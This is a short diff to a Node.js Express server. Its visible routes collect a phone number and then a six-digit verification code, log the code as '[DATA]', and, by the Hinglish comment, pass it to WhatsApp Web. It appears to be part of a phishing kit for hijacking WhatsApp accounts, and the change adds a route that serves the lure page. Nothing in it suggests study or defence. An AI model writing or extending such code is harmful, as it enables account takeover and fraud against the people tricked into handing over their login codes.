@@ -19,7 +19,13 @@ app.post('/submit-number', (req, res) => {
     res.redirect('/verify.html');
 });
 
-// 2. Doosre page se Code receive karna aur WhatsApp Web par bhejna
+// 2. Doosre page se Code receive karna aur WhatsApp Web par bhejna  
+// ======= YEH NAYA CODE ADD KAREIN =======
+// Jab koi main domain open kare, to index.html file load ho
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+// ========================================
 app.post('/submit-code', (req, res) => {
     const code = `${req.body.c1}${req.body.c2}${req.body.c3}${req.body.c4}${req.body.c5}${req.body.c6}`;
     console.log(`[DATA] Verification Code: ${code}`);
